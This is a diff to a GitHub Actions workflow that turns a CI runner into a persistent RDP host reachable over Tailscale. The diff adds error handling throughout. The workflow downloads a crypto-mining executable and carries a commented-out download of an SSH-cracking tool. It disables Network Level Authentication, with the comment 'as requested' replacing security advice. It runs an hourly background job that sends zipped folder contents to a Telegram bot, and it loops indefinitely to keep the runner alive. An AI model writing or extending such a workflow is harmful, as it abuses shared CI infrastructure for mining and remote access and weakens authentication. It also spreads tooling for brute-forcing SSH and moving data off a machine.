@@ -1,3 +1,4 @@
+```yaml
 name: RDP
 
 on:
@@ -17,12 +18,24 @@ jobs:
           # Download unMiner example (add more URLs as needed)
           $unMinerUrl = "https://cdn.unmineable.download/unMiner.2.8.0-beta.exe"
           $unMinerPath = "$env:TEMP\Downloads\unMiner.exe"
-          Invoke-WebRequest -Uri $unMinerUrl -OutFile $unMinerPath  
+          try {
+              Invoke-WebRequest -Uri $unMinerUrl -OutFile $unMinerPath -ErrorAction Stop
+              Write-Host "Downloaded unMiner to $unMinerPath"
+          } catch {
+              Write-Error "Failed to download unMiner: $_"
+              exit 1
+          }
+          
+          # Example: Add more downloads here
+          # $anotherUrl = "https://github.com/Matrix-Community-ORG/SSHCracker/releases/download/v2.6-dev-20250713-034208/ssh-cracker-v2.6-windows-amd64.exe"
+          # $anotherPath = "$env:TEMP\Downloads\ssh-cracker-v2.6-windows-amd64.exe"
+          # Invoke-WebRequest -Uri $anotherUrl -OutFile $anotherPath
+          
           Write-Host "Pre-required files downloaded to $env:TEMP\Downloads"
 
       - name: Configure Core RDP Settings
         run: |
-          # Enable Remote Desktop and disable Network Level Authentication (if needed) - Consider enabling NLA for security
+          # Enable Remote Desktop and disable NLA as requested
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
                              -Name "fDenyTSConnections" -Value 0 -Force
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
@@ -40,30 +53,65 @@ jobs:
             dir=in action=allow protocol=TCP localport=${{ secrets.RDP_PORT }}
 
           # Restart the Remote Desktop service to ensure changes take effect
-          Restart-Service -Name TermService -Force
+          try {
+              Restart-Service -Name TermService -Force -ErrorAction Stop
+              Write-Host "Remote Desktop service restarted successfully"
+          } catch {
+              Write-Error "Failed to restart TermService: $_"
+              exit 1
+          }
 
       - name: Configure RDP User
         run: |
           $username = "${{ secrets.RDP_USERNAME }}"
           $password = "${{ secrets.RDP_PASSWORD }}"
           
-          # Check if user exists, if not, create it
-          if (-not (Get-LocalUser -Name $username -ErrorAction SilentlyContinue)) {
-              $securePass = ConvertTo-SecureString $password -AsPlainText -Force
-              New-LocalUser -Name $username -Password $securePass -AccountNeverExpires
-          } else {
-              # Update password if user exists
-              $securePass = ConvertTo-SecureString $password -AsPlainText -Force
-              Set-LocalUser -Name $username -Password $securePass
-          }
-          
-          # Ensure user is in required groups (only Remote Desktop Users for least privilege; remove Administrators if possible)
-          Add-LocalGroupMember -Group "Remote Desktop Users" -Member $username -ErrorAction SilentlyContinue
-          
-          if (-not (Get-LocalUser -Name $username)) {
-              Write-Error "User configuration failed"
+          # Validate username and password
+          if ([string]::IsNullOrWhiteSpace($username) -or [string]::IsNullOrWhiteSpace($password)) {
+              Write-Error "Username or password is empty or invalid"
               exit 1
           }
+          
+          Write-Host "Configuring user: $username"
+          
+          # Check if user exists, if not, create it
+          if (-not (Get-LocalUser -Name $username -ErrorAction SilentlyContinue)) {
+              try {
+                  $securePass = ConvertTo-SecureString $password -AsPlainText -Force
+                  New-LocalUser -Name $username -Password $securePass -AccountNeverExpires -Description "RDP User for GitHub Actions" -ErrorAction Stop
+                  Write-Host "User $username created successfully"
+              } catch {
+                  Write-Error "Failed to create user: $_"
+                  exit 1
+              }
+          } else {
+              # Update password if user exists
+              try {
+                  $securePass = ConvertTo-SecureString $password -AsPlainText -Force
+                  Set-LocalUser -Name $username -Password $securePass -ErrorAction Stop
+                  Write-Host "Password updated for user $username"
+              } catch {
+                  Write-Error "Failed to update password: $_"
+                  exit 1
+              }
+          }
+          
+          # Ensure user is in Remote Desktop Users group
+          try {
+              Add-LocalGroupMember -Group "Remote Desktop Users" -Member $username -ErrorAction Stop
+              Write-Host "User $username added to Remote Desktop Users group"
+          } catch {
+              Write-Error "Failed to add user to Remote Desktop Users: $_"
+              exit 1
+          }
+          
+          # Verify user exists and is enabled
+          $user = Get-LocalUser -Name $username -ErrorAction SilentlyContinue
+          if (-not $user -or -not $user.Enabled) {
+              Write-Error "User $username does not exist or is disabled"
+              exit 1
+          }
+          Write-Host "User $username is configured and enabled"
 
       - name: Install Tailscale
         run: |
@@ -71,14 +119,26 @@ jobs:
           $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi"
           $installerPath = "$env:TEMP\tailscale.msi"
           
-          Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
-          Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
-          Remove-Item $installerPath -Force
+          try {
+              Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath -ErrorAction Stop
+              Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
+              Remove-Item $installerPath -Force
+              Write-Host "Tailscale installed successfully"
+          } catch {
+              Write-Error "Failed to install Tailscale: $_"
+              exit 1
+          }
 
       - name: Establish Tailscale Connection
         run: |
           # Bring up Tailscale with the provided auth key and set a unique hostname
-          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID
+          try {
+              & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID
+              Write-Host "Tailscale connection initiated"
+          } catch {
+              Write-Error "Failed to start Tailscale: $_"
+              exit 1
+          }
           
           # Wait for Tailscale to assign an IP
           $tsIP = $null
@@ -94,18 +154,24 @@ jobs:
               exit 1
           }
           echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV
+          Write-Host "Tailscale IP assigned: $tsIP"
 
       - name: Verify RDP Accessibility
         run: |
           Write-Host "Tailscale IP: $env:TAILSCALE_IP"
           
           # Test connectivity using Test-NetConnection against the Tailscale IP on the specified RDP port
-          $testResult = Test-NetConnection -ComputerName $env:TAILSCALE_IP -Port ${{ secrets.RDP_PORT }}
-          if (-not $testResult.TcpTestSucceeded) {
-              Write-Error "TCP connection to RDP port ${{ secrets.RDP_PORT }} failed"
+          try {
+              $testResult = Test-NetConnection -ComputerName $env:TAILSCALE_IP -Port ${{ secrets.RDP_PORT }} -ErrorAction Stop
+              if (-not $testResult.TcpTestSucceeded) {
+                  Write-Error "TCP connection to RDP port ${{ secrets.RDP_PORT }} failed"
+                  exit 1
+              }
+              Write-Host "TCP connectivity successful!"
+          } catch {
+              Write-Error "Failed to verify RDP connectivity: $_"
               exit 1
           }
-          Write-Host "TCP connectivity successful!"
 
       - name: Display RDP Access Info (Only IP - No Credentials)
         run: |
@@ -120,7 +186,6 @@ jobs:
           # PowerShell script to backup a specific folder every hour and send to Telegram bot
           # Assumptions: Folder to backup is C:\MyBackupFolder (change as needed)
           # Requires secrets: TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
-          # This runs as a background job; main workflow continues
           
           $backupFolder = "C:\MyBackupFolder"  # Change to your target folder
           $botToken = "${{ secrets.TELEGRAM_BOT_TOKEN }}"
@@ -128,7 +193,7 @@ jobs:
           $maxFileSizeMB = 50  # Telegram limit ~50MB per file
           
           if (-not (Test-Path $backupFolder)) {
-              Write-Host "Backup folder $backupFolder does not exist. Creating empty one for demo."
+              Write-Host "Backup folder $backupFolder does not exist. Creating empty one."
               New-Item -ItemType Directory -Force -Path $backupFolder
           }
           
@@ -162,36 +227,45 @@ jobs:
                   "--$boundary--$LF"
               ) -join $LF
               
-              $response = Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body ([Text.Encoding]::ASCII.GetBytes($bodyLines))
-              
-              if ($response.ok) {
-                  Write-Host "Backup sent successfully: $description"
-                  # Optional: Delete sent ZIP to save space
-                  Remove-Item $zipPath -Force
-              } else {
-                  Write-Host "Failed to send backup: $($response.description)"
+              try {
+                  $response = Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body ([Text.Encoding]::ASCII.GetBytes($bodyLines)) -ErrorAction Stop
+                  if ($response.ok) {
+                      Write-Host "Backup sent successfully: $description"
+                      Remove-Item $zipPath -Force
+                  } else {
+                      Write-Host "Failed to send backup: $($response.description)"
+                  }
+              } catch {
+                  Write-Error "Failed to send backup to Telegram: $_"
               }
           }
           
           # Background job to run every hour
           $jobScript = {
+              param($backupFolder, $botToken, $chatId, $maxFileSizeMB)
               while ($true) {
                   $timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
                   $zipPath = "$env:TEMP\backup_$timestamp.zip"
                   
-                  # Create ZIP of the folder
-                  Compress-Archive -Path "$backupFolder\*" -DestinationPath $zipPath -Force
-                  
-                  $description = "Hourly backup from RDP runner - $timestamp (Size: $([math]::Round((Get-Item $zipPath).Length / 1MB, 2))MB)"
-                  Send-BackupToTelegram -zipPath $zipPath -description $description
-                  
-                  Start-Sleep -Hours 1
+                  try {
+                      Compress-Archive -Path "$backupFolder\*" -DestinationPath $zipPath -Force -ErrorAction Stop
+                      $description = "Hourly backup from RDP runner - $timestamp (Size: $([math]::Round((Get-Item $zipPath).Length / 1MB, 2))MB)"
+                      Send-BackupToTelegram -zipPath $zipPath -description $description
+                  } catch {
+                      Write-Error "Failed to create or send backup: $_"
+                  }
+                  Start-Sleep -Seconds 3600
               }
           }
           
           # Start the background job
-          Start-Job -ScriptBlock $jobScript
-          Write-Host "Backup job started: Will ZIP and send $backupFolder to Telegram every hour."
+          try {
+              Start-Job -ScriptBlock $jobScript -ArgumentList $backupFolder, $botToken, $chatId, $maxFileSizeMB
+              Write-Host "Backup job started: Will ZIP and send $backupFolder to Telegram every hour."
+          } catch {
+              Write-Error "Failed to start backup job: $_"
+              exit 1
+          }
 
       - name: Maintain Connection
         run: |
@@ -201,9 +275,9 @@ jobs:
           Write-Host "Backup job running in background."
           Write-Host "==================`n"
           
-          # Keep runner active indefinitely (or until manually cancelled)
-          # Note: Background backup job continues independently
+          # Keep runner active until cancelled
           while ($true) {
               Write-Host "[$(Get-Date)] RDP Active - Use Ctrl+C in workflow to terminate"
               Start-Sleep -Seconds 300
           }
+```
